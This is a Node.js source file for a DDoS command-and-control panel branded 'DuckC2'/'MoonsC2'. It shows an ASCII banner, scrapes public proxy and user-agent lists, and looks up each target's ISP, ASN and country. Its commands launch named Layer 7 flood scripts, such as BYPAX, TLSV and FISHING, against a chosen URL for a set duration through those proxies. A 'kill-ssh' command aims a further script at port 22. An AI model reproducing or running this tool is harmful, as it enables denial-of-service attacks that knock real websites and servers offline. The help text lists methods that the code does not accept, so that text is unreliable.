#!/usr/bin/env node

const { exec, spawn } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '5.1.7'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function banner() {
console.clear()
BLUE='\033[34m'
RED='\033[31m'
GREEN='\033[32m'
BRIGHT_BLUE='\033[94m'
BRIGHT_PURPLE='\033[95m'
WHITE='\033[97m'
BOLD='\033[1m'
RESET='\033[0m'
console.log(`
${BOLD}${BRIGHT_BLUE}  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡟⠉⣿⣷⠀⠀⠀⠀⠀⠀⠀
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣦⠄     
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⠟⠋⠉⠉⠉⠁⠀⠀    
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⡿⠿⠟⢀⠀⠀⠀⠀⠀         ${WHITE}[ ${GREEN}Welcome Back To DuckC2-API ${WHITE}]
${BRIGHT_BLUE}  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣤⣤⣤⣤⣶⣾⣿⣷⣄⠀⠀⠀⠀⠀       ${WHITE}Owner : ${WHITE}[ ${BRIGHT_PURPLE}t.me/DxoneXX ${WHITE}]
${BRIGHT_BLUE}  ⠀⠀⣷⣦⣤⣤⣤⣤⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⠛⣿⣿⣿⣿⣇⠀⠀⠀⠀       ${WHITE}Username : ${WHITE}[ ${BRIGHT_PURPLE}root ${WHITE}]
${BRIGHT_BLUE}  ⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⢠⣿⣿⣿⣿⡿⠀⠀⠀⠀       ${WHITE}VIP : ${WHITE}[ ${BRIGHT_PURPLE}true ${WHITE}]
${BRIGHT_BLUE}  ⠀⠀⠈⢿⣿⣿⣯⡙⠛⠿⠿⠿⣿⠿⠿⠿⠛⠋⣁⣴⣿⣿⣿⣿⣿⡇⠀⠀⠀        ${WHITE}SUPERVIP : ${WHITE}[ ${BRIGHT_PURPLE}true ${WHITE}]
${BRIGHT_BLUE}  ⠀⠀⠀⠈⠛⠿⣿⣿⣷⣶⣶⣤⣤⣤⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀       ${WHITE}TimeLimit : ${WHITE}[ ${BRIGHT_PURPLE}739600 ${WHITE}]
${BRIGHT_BLUE}  ⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠿⠿⢿⣿⣿⣿⣿⡿⠿⠿⠛⠋⠁⠀⠀⠀⠀          ${WHITE}Expiry : ${WHITE}[ ${BRIGHT_PURPLE}Unlimited ${WHITE}]
${BRIGHT_BLUE}  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⣤⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${BRIGHT_BLUE}  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣼⣶⣿⣷⣶⣤⡀                      ${BRIGHT_BLUE}- Powered By DuckC2 -
  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠀    ${WHITE}Copyright © 2024 - 2025 DxoneXmoonS All Right reserved
                                   ${WHITE}Type "${BRIGHT_BLUE}help${WHITE}" For Available Commands ${RESET}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`)}
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`Loading, please wait...`);

    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`);
    console.log(`Dependencies installed...`);

    const getLatestVersion = await fetch('https://raw.githubusercontent.com/permenmd/cache/main/version.txt');
    const latestVersion = await getLatestVersion.text();
    console.log(`Checking version...`);

    if (version === latestVersion.trim()) {
      console.log(`Version is up to date...`);

      await scrapeProxy();
      console.log(`Proxies scraped...`);

      await scrapeUserAgent();
      console.log(`User agents scraped...`);

      await sleep(700);
      console.clear();
      console.log(`Welcome To SkyranXMods Tools ${version}`);
      await sleep(1000);
      await banner();
      sigma();
    } else {
      console.log(`This version is outdated. ${version} => ${latestVersion.trim()}`);
      console.log(`Waiting for auto-update...`);

      await exec(`npm uninstall -g prmnmd-tuls`);
      console.log(`Uninstalling outdated version...`);

      await exec(`npm i -g prmnmd-tuls`);
      console.log(`Installing updated version...`);

      console.log(`Restart the tools, please.`);
      process.exit();
    }
  } catch (error) {
    console.log(`Are you online?`);
  }
}
// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
// [========================================] //
// Fungsi untuk mendapatkan waktu dalam format yang diinginkan
function getTimeStamp() {
  const date = new Date();
  const month = date.toLocaleString('en-US', { month: 'short' });
  const day = date.toLocaleString('en-US', { day: '2-digit' });
  const year = date.getFullYear();
  return `${month}/${day}/${year}`;
}

// [========================================] //
// Daftar metode yang tersedia
const availableMethods = [
  'FISHING', 'BYPAX', 'CSTRO', 'TLSV', 'ARES', 'HTTPX', 'UAMV', 'KILLOW', 'WIND', 'TLSX', 'HTRAN', 'SWORD'
];

// [========================================] //
// Memperbarui fungsi untuk mendukung format baru [METHOD] [TARGET] [DURATION]
async function handleMethodCommand(args) {
  if (args.length < 3) {
    console.log(`Example: <METHOD> <target> <port> <duration>
FLOOD https://google.com 443 120`);
    sigma();
    return;
  }

  const [method, target, port, duration] = args;

  // Validasi metode yang dipilih
  if (!availableMethods.includes(method.toUpperCase())) {
    console.log(`Method ${method} not recognized. Available methods are: ${availableMethods.join(', ')}`);
    sigma();
    return;
  }

  try {
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as,country,org,ip`);
    const result = scrape.data;

    // Menambahkan tampilan waktu attack menggunakan getTimeStamp
    const timestamp = getTimeStamp();
BLUE='\033[34m'
RED='\033[31m'
GREEN='\033[32m'
BRIGHT_BLUE='\033[94m'
BRIGHT_PURPLE='\033[95m'
WHITE='\033[97m'
BOLD='\033[1m'
RESET='\033[0m'
    console.log(`
${BOLD}.  Attack Details
       Status:   [ ${GREEN}Attack Succesfully Sent ${WHITE}]
       Host:     [ ${BRIGHT_PURPLE}${target} ${WHITE}]
       Port:     [ ${BRIGHT_PURPLE}${port} ${WHITE}]
       Methods:  [ ${BRIGHT_PURPLE}${method} ${WHITE}]
       Duration: [ ${BRIGHT_PURPLE}${duration} ${WHITE}]
       Sent On:  [ ${BRIGHT_PURPLE}${timestamp} ${WHITE}]
   Target Details
       ISP:      [ ${BRIGHT_PURPLE}${result.isp} ${WHITE}]
       ORG:      [ ${BRIGHT_PURPLE}${result.org} ${WHITE}]
       Country:  [ ${BRIGHT_PURPLE}${result.country} ${WHITE}]
       ASN:      [ ${BRIGHT_PURPLE}${result.as} ${WHITE}] ${RESET}
    `);
  } catch (error) {
    console.log(`Oops Something Went wrong`);
  }

  // Eksekusi metode berdasarkan pilihan
  const metode = path.join(__dirname, `/lib/cache/${method.toLowerCase()}.js`);
  
  if (method === 'BYPAX') {
    pushOngoing(target, method, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
  } else if (method === 'HTTPX') {
    pushOngoing(target, method, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
  } else if (method === 'FISHING') {
    pushOngoing(target, method, duration);
    exec(`node ${metode} GET ${target} ${duration} 100 90 proxy.txt --full --legit`);
    sigma();
  } else if (method === 'KILLOW') {
    pushOngoing(target, method, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
  } else if (method === 'TLSV') {
    pushOngoing(target, method, duration);
    exec(`node ${metode} ${target} ${duration} 100 90 proxy.txt`);
    sigma();
  } else if (method === 'ARES') {
    pushOngoing(target, method, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
  } else if (method === 'UAMV') {
    pushOngoing(target, method, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
  } else if (method === 'WIND') {
    pushOngoing(target, method, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
  } else if (method === 'CSTRO') {
    pushOngoing(target, method, duration);
    exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`);
    sigma();
  } else if (method === 'HTRAN') {
    pushOngoing(target, method, duration);
    exec(`node ${metode} ${target} ${duration}`);
    sigma();
  } else if (method === 'TLSX') {
    pushOngoing(target, method, duration);
    exec(`node ${metode} ${target} ${duration} 100 60 proxy.txt`);
    sigma();
  } else if (method === 'SWORD') {
    pushOngoing(target, method, duration);
    exec(`node ${metode} ${target} ${duration} 100 20 proxy.txt`);
    sigma();
  } else {
    console.log(`Method ${method} not recognized.`);
  }
}
// [========================================] //


async function killSSH(args) {
  if (args.length < 2) {
    console.log(`Example: kill-ssh <target> <duration>
kill-ssh 123.456.789.10 120 flood`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋    [ \x1b[1m\x1b[36mCreator   : Skyran\x1b[0m ]
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋    ⠀ [ \x1b[1m\x1b[36mVip       : true\x1b[0m ]
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀      [ \x1b[1m\x1b[36mPremium   : true\x1b[0m ]
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀   ⠀ ⠀[ \x1b[1m\x1b[36mTelegram  : t.me/SkyR4n\x1b[0m ]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀   ⠀ ⠀⠀[ \x1b[1m\x1b[36mWhatsApp  : 0857-8063-7142\x1b[0m ]
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀    ⠀ [ \x1b[1m\x1b[36mTimeLimit : 99999\x1b[0m ]
KETIK \x1b[1m\x1b[36m"CLS"\x1b[0m UNTUK KEMBALI KE MENU AWAL
-----------------------------------------------------------------
Target   : ${target}
Duration : ${duration}
ISP      : ${result.isp}
Ip       : ${result.query}
AS       : ${result.as}
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/StarsXSSH`);
exec(`node ${metode} ${target} 22 root ${duration}`)
sigma()
};
// [========================================] //
async function sigma() {
  const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`);
  const latestNews = await getNews.text();
  const creatorCredits = `
Created And Coded Full By SkyranXMods
...
`;

permen.question('╭─[MoonsC2]-[~/cnc/root]\n╰─► ', (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

 // Convert command to lowercase to handle 'HELP', 'Help', 'help', etc.
  const normalizedCommand = command.toLowerCase();

    if (normalizedCommand === 'help') {
      console.log(`
NAME            ┃ DASHBOARD 
━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
METHODS         ┃    DDoS Methods List
ONGOING         ┃    Ongoing Attack History
ATTACK          ┃    Running a DDos Attack
CLS             ┃    Clear Terminal
`);
      sigma();
    } else if (availableMethods.includes(command.toUpperCase())) {
      handleMethodCommand([command, ...args]);
    } else if (normalizedCommand === 'methods') {
      console.log(`
NAME        ┃ DESCRIPTION                                                 ┃  DURATION
━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━
THUNDER     ┃  [ BASIC ] LAYER 7 - ATTACK URL [ Massive Power Methods ]   ┃ 300
BROWSER     ┃  [ BASIC ] LAYER 7 - ATTACK URL [ Browser Spam Server ]     ┃ 300
BYPASS      ┃  [ BASIC ] LAYER 7 - ATTACK URL [ Bypass With High Power ]  ┃ 300
TLSVIP      ┃  [ BASIC ] LAYER 7 - ATTACK URL [ TLS-X 5,2 ]               ┃ 300
HTTPS       ┃  [ BASIC ] LAYER 7 - ATTACK URL [ Encrypted Requests ]      ┃ 300
SWORD       ┃  [ BASIC ] LAYER 7 - ATTACK URL [ Quick Attack ]            ┃ 500
FLOOD       ┃  [ BASIC ] LAYER 7 - ATTACK URL [ FLOOD-X Flooder ]         ┃ 7200
FISHING     ┃  [ VIP ]   LAYER 7 - ATTACK URL [ F-X Best Methods ]        ┃ 120
`);
      sigma();
    } else if (normalizedCommand === 'ongoing') {
      ongoingAttack();
      sigma();
    } else if (normalizedCommand === 'cls') {
      banner();
      sigma();
    } else {
      console.log(`${command} NOT FOUND`);
      sigma();
    }
  });
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()